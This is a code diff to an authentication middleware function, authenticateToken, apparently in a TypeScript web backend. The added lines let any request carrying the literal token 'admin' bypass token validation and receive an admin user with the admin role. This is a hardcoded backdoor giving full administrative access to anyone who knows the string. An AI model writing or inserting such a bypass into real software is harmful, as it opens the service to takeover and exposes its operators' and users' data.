@@ -31,6 +31,13 @@ export const authenticateToken = async (
     return;
   }
 
+  // Bypass authentication for admin token
+  if (token === 'admin') {
+    req.user = { id: 'admin', role: 'admin', name: 'Admin User' };
+    next();
+    return;
+  }
+
   try {
     // First check if token is valid
     const tokenValidity = await authService.checkTokenValidity(token);
